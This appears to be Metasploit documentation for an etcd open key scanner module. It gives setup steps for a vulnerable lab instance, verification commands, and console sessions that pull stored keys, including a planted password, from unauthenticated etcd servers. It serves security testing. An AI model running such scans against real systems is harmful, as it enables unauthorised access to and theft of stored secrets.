## Vulnerable Application

etcd is a distributed reliable key-value store, which when used in an open and default configuration gives
unauthenticated users access to the data stored via HTTP API.

### Centos 7.1

  1. `yum install etcd`
  2. `vi /etc/etcd/etcd.conf` replace (and uncomment) items with `localhost` for your IP.
  3. `systemctl start etcd; systemctl enable etcd`
  4. On Centos 7.1 you need to mod (or disable) the firewall: `systemctl stop firewalld`
  5. Lastly, lets add a key-value for interest: `curl http://[IP]:2379/v2/keys/supersecret -XPUT -d value="password!"`

### Docker

  1. `docker run -p 2379:2379 miguelgrinberg/easy-etcd`

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/etcd/open_key_scanner```
  4. Do: ```set rhosts [IPs]```
  5. Do: ```run```
  6. You should get a JSON response, and the data saved to `loot`.

## Scenarios

### etcd 3.2.15 on CentOS 7.1

```
msf5 > use auxiliary/scanner/etcd/open_key_scanner
msf5 auxiliary(scanner/etcd/open_key_scanner) > set rhosts 2.2.2.2
rhosts => 2.2.2.2
msf5 auxiliary(scanner/etcd/open_key_scanner) > run

[+] 2.2.2.2:2379
Version: {"etcdserver":"3.2.15","etcdcluster":"3.2.0"}
Data: {
  "action": "get",
  "node": {
    "dir": true,
    "nodes": [
      {
        "key": "/supersecret",
        "value": "password",
        "modifiedIndex": 6,
        "createdIndex": 6
      }
    ]
  }
}

Loot
====

host           service  type       name       content     info       path
----           -------  ----       ----       -------     ----       ----
2.2.2.2                 etcd.data  etcd.keys  text/plain  etcd keys  /root/.msf4/loot/20180325144351_default_2.2.2.2_etcd.data_425280.txt

msf5 auxiliary(scanner/etcd/open_key_scanner) > services
Services
========

host           port  proto  name  state  info
----           ----  -----  ----  -----  ----
2.2.2.2        2379  tcp    etcd  open   {"etcdserver":"3.2.15","etcdcluster":"3.2.0"}
```

### etcd in Docker

```
msf5 > use auxiliary/scanner/etcd/open_key_scanner
msf5 auxiliary(scanner/etcd/open_key_scanner) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf5 auxiliary(scanner/etcd/open_key_scanner) > run

[+] 127.0.0.1:2379
Version: {"etcdserver":"3.1.3","etcdcluster":"3.1.0"}
Data: {
  "action": "get",
  "node": {
    "dir": true
  }
}
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/etcd/open_key_scanner) > loot

Loot
====

host       service  type       name       content    info       path
----       -------  ----       ----       -------    ----       ----
127.0.0.1           etcd.data  etcd.keys  text/json  etcd keys  /root/.msf4/loot/20180328092245_default_127.0.0.1_etcd.data_260058.txt

msf5 auxiliary(scanner/etcd/open_key_scanner) > services
Services
========

host       port  proto  name  state  info
----       ----  -----  ----  -----  ----
127.0.0.1  2379  tcp    etcd  open   {"etcdserver":"3.1.3","etcdcluster":"3.1.0"}
```
